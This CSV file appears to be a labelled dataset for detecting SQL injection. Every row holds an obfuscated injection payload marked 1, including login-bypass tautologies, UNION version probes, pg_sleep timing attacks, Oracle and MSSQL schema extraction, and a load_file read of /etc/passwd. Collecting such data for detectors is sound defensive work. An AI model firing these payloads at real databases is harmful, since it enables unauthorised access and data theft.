Query,Label
""" %%o%%r pg_sleep  (  __TIME__  )  --",1
c%re%%a%t%%e user name identified %b%y pass123 temp%%o%%rary t%%ab%lespace temp default t%%ab%lespace users;,1
" %a%%n%%d 1  =  utl_%%i%%naddr.get_host_address   (    (   %s%%el%%e%%ct D%%i%%sT%%i%%nCT  (  %ta%%ble_name  )   %f%%rom   (  %s%%el%%e%%ct D%%i%%sT%%i%%nCT  (  %ta%%ble_name  )  , ROWNUM AS %l%i%m%it %f%%rom sys.all_%ta%%bles  )   %wh%e%%r%%e %l%i%m%it  =  5   )    )    %a%%n%%d 'i'  =  'i",1
" sel%%e%c%%t * %%fr%om users %w%he%r%e id  =  '1' %%o%r @ @1  =  1 un%i%on sel%%e%c%%t 1,version  (    )   -- 1'",1
" %%s%e%%le%ct * %fr%%om users w%%h%er%%e id  =  1 %or 1#""  (   %%u%n%i%%on %%s%e%%le%ct 1,version  (    )   -- 1",1
 %s%%el%%ec%%t name %f%%r%o%%m syscolumns %%w%h%%er%e id   =     (  %s%%el%%ec%%t id %f%%r%o%%m sysobjects %%w%h%%er%e name   =   %%t%a%%b%l%%ename'  )  --,1
%%select * %f%r%om users wh%%e%r%e id  =  1 +$+ %%o%%r 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" %s%%elec%%t * %%f%%ro%%m users w%%he%%r%e id  =  '1' o%r ||/1  =  1 %%u%%ni%o%%n %s%%elec%%t 1,version  (    )   -- 1'",1
" s%%e%%l%e%c%t * %%f%%r%%o%m users wh%e%r%%e id  =  '1' o%r \.<\ %%un%%i%o%%n s%%e%%l%e%c%t 1,@@VERSION -- 1'",1
? %o%r 1  =  1 --,1
 )   %o%r   (  'a'  =  'a,1
admi%%n' %o%r 1  =  1#,1
" s%%e%l%e%c%t * %%fro%m users %w%%he%%r%e id  =  1 %or ""  (  ]"" %or 1  =  1 -- 1",1
o%%r 1  =  1 --,1
" %%a%%n%%d 1  =  utl_%i%naddr.get_host_address   (    (   %s%e%le%%c%%t D%isT%i%nCT  (  column_name  )   f%%ro%m   (  %s%e%le%%c%%t D%isT%i%nCT  (  column_name  )  , ROWNUM AS l%%imi%%t f%%ro%m all_tab_columns  )   %%w%%he%%re l%%imi%%t  =  5   )    )    %%a%%n%%d 'i'  =  'i",1
" se%%l%%e%ct * %%fr%o%%m users %w%%he%%re id  =  '1' %!<@ %%u%n%%i%on se%%l%%e%ct 1,version  (    )   -- 1'",1
" %%s%e%lec%t * %%fro%%m users %%whe%%r%%e id  =  1 %o%r ""&  (  "" %o%r 1  =  1 -- 1",1
" %sel%e%%c%t * %f%%ro%%m users %w%%h%%e%%r%e id  =  1 %or ""?  (  "" %or 1  =  1 -- 1",1
d%i%st%i%%nct,1
%%s%e%l%%e%c%%t * %%f%%r%om users w%h%%e%r%e id  =  '1' *  (  \  )   %%o%%r 1  =  1 -- 1',1
"1 %an%%d %%as%cii  (  lower  (  substri%ng   (    (   %s%el%e%%c%t top 1 name f%ro%%m sysobjects %%w%her%e xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
%s%%e%%le%%ct * f%r%%o%%m users %w%%her%e id  =  1 o%r \.<\ o%r 1  =  1 -- 1,1
"adm%%i%%n"" %%o%%r ""1""  =  ""1""--",1
" %se%%le%%c%t * f%r%%o%m users %w%%here id  =  1 o%r ""%{"" o%r 1  =  1 -- 1",1
i%n%%s%e%r%t,1
" %sele%c%%t * f%r%o%m users %whe%%re id  =  1 %o%r 1#""?  =  1 %o%r 1  =  1 -- 1",1
" se%%l%%ec%%t * %f%r%%o%m users w%%he%%r%%e id  =  1 %%or ""%?"" %%or 1  =  1 -- 1",1
